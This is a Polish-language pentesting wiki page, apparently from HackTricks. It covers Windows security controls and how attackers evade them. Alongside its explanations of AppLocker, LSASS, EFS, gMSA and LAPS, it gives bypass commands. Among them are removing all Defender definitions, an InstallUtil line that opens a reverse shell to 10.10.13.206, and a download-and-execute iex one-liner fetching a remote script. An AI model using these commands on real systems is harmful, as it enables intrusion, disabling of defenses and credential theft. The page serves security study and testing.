# Mechanizmy kontroli bezpieczeństwa systemu Windows

{{#include ../banners/hacktricks-training.md}}

## Zasady AppLocker

Biała lista aplikacji to lista zatwierdzonych aplikacji lub plików wykonywalnych, których obecność i uruchamianie w systemie są dozwolone. Jej celem jest ochrona środowiska przed szkodliwym malware i niezatwierdzonym oprogramowaniem, które nie odpowiada konkretnym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to **rozwiązanie firmy Microsoft do tworzenia białych list aplikacji**, które daje administratorom systemu kontrolę nad tym, **które aplikacje i pliki użytkownicy mogą uruchamiać**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalatora Windows, bibliotekami DLL, aplikacjami pakietowymi i instalatorami aplikacji pakietowych.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz dostęp do zapisu w określonych katalogach, **ale wszystko to można obejść**.

### Sprawdzenie

Sprawdź, które pliki/rozszerzenia znajdują się na czarnej/białej liście:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ta ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, umożliwiając sprawdzenie bieżącego zestawu reguł egzekwowanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Przydatne **zapisywalne foldery** do ominięcia zasad AppLocker: Jeśli AppLocker zezwala na wykonywanie dowolnych plików wewnątrz `C:\Windows\System32` lub `C:\Windows`, istnieją **zapisywalne foldery**, których możesz użyć, aby **ominąć te zasady**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Powszechnie **zaufane** pliki binarne [**„LOLBAS”**](https://lolbas-project.github.io/) również mogą być przydatne do ominięcia AppLocker.
- **Nieprawidłowo napisane reguły również można ominąć**
- Na przykład w przypadku **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** możesz utworzyć **folder o nazwie `allowed`** w dowolnym miejscu, a będzie on dozwolony.
- Organizacje często skupiają się również na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
- **Wymuszanie DLL bardzo rzadko jest włączone** ze względu na dodatkowe obciążenie, jakie może powodować w systemie, oraz ilość testów wymaganą do zagwarantowania, że nic nie przestanie działać. Dlatego używanie **DLL jako backdoorów pomoże ominąć AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać** kod **Powershell** w dowolnym procesie i ominąć AppLocker. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Przechowywanie poświadczeń

### Security Accounts Manager (SAM)

Lokalne poświadczenia znajdują się w tym pliku, a hasła są zahashowane.

### Local Security Authority (LSA) - LSASS

**Poświadczenia** (zahashowane) są **zapisywane w pamięci** tego podsystemu ze względu na funkcję Single Sign-On.\
**LSA** administruje lokalną **polityką bezpieczeństwa** (polityką haseł, uprawnieniami użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA sprawdza **podane poświadczenia** w pliku **SAM** (podczas logowania lokalnego) i komunikuje się z **kontrolerem domeny**, aby uwierzytelnić użytkownika domenowego.

**Poświadczenia** są **zapisywane wewnątrz procesu LSASS**: bilety Kerberos, hashe NT i LM oraz łatwo odszyfrowywane hasła.

### Sekrety LSA

LSA może zapisywać niektóre poświadczenia na dysku:

- Hasło konta komputera w Active Directory (niedostępnego kontrolera domeny).
- Hasła kont usług Windows
- Hasła zadań zaplanowanych
- Więcej (hasła aplikacji IIS...)

### NTDS.dit

Jest to baza danych Active Directory. Występuje wyłącznie na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to program Antivirus dostępny w Windows 10 i Windows 11 oraz w wersjach Windows Server. **Blokuje** typowe narzędzia pentestingowe, takie jak **`WinPEAS`**. Istnieją jednak sposoby na **ominięcie tych zabezpieczeń**.

### Sprawdzanie

Aby sprawdzić **status** programu **Defender**, możesz wykonać cmdlet PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy jest aktywny):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby go wyliczyć, możesz również uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS zabezpiecza pliki za pomocą szyfrowania, wykorzystując **klucz symetryczny** znany jako **File Encryption Key (FEK)**. Ten klucz jest szyfrowany przy użyciu **klucza publicznego** użytkownika i przechowywany w **alternatywnym strumieniu danych** $EFS zaszyfrowanego pliku. Gdy konieczne jest odszyfrowanie, odpowiadający mu **klucz prywatny** certyfikatu cyfrowego użytkownika służy do odszyfrowania FEK ze strumienia $EFS. Więcej informacji można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze odszyfrowywania bez inicjowania przez użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików innego niż EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania zapewnia właścicielowi **przezroczysty dostęp** do zaszyfrowanych plików. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi odszyfrowania.

**Najważniejsze informacje**:

- EFS używa symetrycznego FEK, szyfrowanego za pomocą klucza publicznego użytkownika.
- Odszyfrowywanie wykorzystuje klucz prywatny użytkownika do uzyskania dostępu do FEK.
- Automatyczne odszyfrowywanie następuje w określonych warunkach, takich jak kopiowanie do FAT32 lub transmisja przez sieć.
- Zaszyfrowane pliki są dostępne dla właściciela bez wykonywania dodatkowych czynności.

### Sprawdzanie informacji o EFS

Sprawdź, czy **użytkownik** **korzystał** z tej **usługi**, sprawdzając, czy istnieje ta ścieżka:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **dostęp** do pliku, używając cipher /c \<file>\
Możesz również użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **zaszyfrować** i **odszyfrować** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Będąc Authority System

To podejście wymaga, aby **użytkownik będący ofiarą** miał **uruchomiony** **proces** na hoście. Jeśli tak jest, z sesji `meterpreter` możesz podszyć się pod token procesu użytkownika (`impersonate_token` z `incognito`). Alternatywnie możesz wykonać `migrate` do procesu użytkownika.

#### Znając hasło użytkownika

Mimikatz może zaimportować certyfikat i klucz prywatny użytkownika, a następnie użyć ich do odszyfrowania plików chronionych przez EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft opracował **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, w których często włączone jest ustawienie "**Password never expire**", gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatyczne zarządzanie hasłami**: gMSA używają złożonego, 240-znakowego hasła, które jest automatycznie zmieniane zgodnie z zasadami domeny lub komputera. Proces ten jest obsługiwany przez Microsoft Key Distribution Service (KDC), co eliminuje konieczność ręcznej aktualizacji haseł.
- **Zwiększone bezpieczeństwo**: Te konta są odporne na blokady i nie mogą być używane do logowania interaktywnego, co zwiększa ich bezpieczeństwo.
- **Obsługa wielu hostów**: gMSA mogą być współdzielone między wieloma hostami, dzięki czemu idealnie nadają się do usług uruchamianych na wielu serwerach.
- **Obsługa zadań zaplanowanych**: W przeciwieństwie do managed service accounts, gMSA obsługują uruchamianie zadań zaplanowanych.
- **Uproszczone zarządzanie SPN**: System automatycznie aktualizuje Service Principal Name (SPN), gdy zmieniają się dane sAMaccount lub nazwa DNS komputera, upraszczając zarządzanie SPN.

Hasła gMSA są przechowywane we właściwości LDAP _**msDS-ManagedPassword**_ i automatycznie resetowane co 30 dni przez kontrolery domeny (DCs). To hasło, będące zaszyfrowanym obiektem danych znanym jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może być pobierane wyłącznie przez upoważnionych administratorów oraz serwery, na których zainstalowano gMSA, co zapewnia bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest bezpieczne połączenie, takie jak LDAPS, lub połączenie musi być uwierzytelnione za pomocą „Sealing & Secure”.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Możesz odczytać to hasło za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Znajdź więcej informacji w tym poście**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Sprawdź również tę [stronę internetową](https://cube0x0.github.io/Relaying-for-gMSA/) opisującą, jak przeprowadzić **NTLM relay attack**, aby **odczytać** **hasło** **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

**Local Administrator Password Solution (LAPS)**, dostępne do pobrania ze strony [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnego administratora. Hasła te, które są **losowe**, unikatowe i **regularnie zmieniane**, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony za pomocą ACL do autoryzowanych użytkowników. Po przyznaniu odpowiednich uprawnień możliwy jest odczyt haseł lokalnego administratora.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blokuje wiele funkcji** potrzebnych do efektywnego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie wyłącznie na zatwierdzone typy .NET, workflows oparte na XAML, klasy PowerShell i inne.

### **Sprawdź**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
W obecnych wersjach Windows ten Bypass nie będzie działać, ale możesz użyć[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, może być konieczne** **wykonanie** _**dodania odwołania**_ -> _Przeglądaj_ ->_Przeglądaj_ -> dodanie `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` oraz **zmiana projektu na .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać** kod Powershell w dowolnym procesie i ominąć constrained mode. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Zasady wykonywania PS

Domyślnie jest ustawiona na **restricted.** Główne sposoby ominięcia tej zasady:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

To API, które może być używane do uwierzytelniania użytkowników.

SSPI odpowiada za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. Następnie SSPI negocjuje, który protokół uwierzytelniania zostanie użyty. Te protokoły uwierzytelniania nazywane są Security Support Provider (SSP), znajdują się na każdej maszynie Windows w postaci biblioteki DLL i obie maszyny muszą obsługiwać ten sam protokół, aby móc się komunikować.

### Główne SSP

- **Kerberos**: Preferowany
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Ze względów kompatybilności
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serwery webowe i LDAP, hasło w postaci hasha MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Służy do negocjowania używanego protokołu (Kerberos lub NTLM, przy czym domyślny jest Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może oferować kilka metod lub tylko jedną.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Omijanie AppLocker i trybu ograniczonego języka PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [jak odszyfrowywać pliki EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying dla gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 sposobów na obejście PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
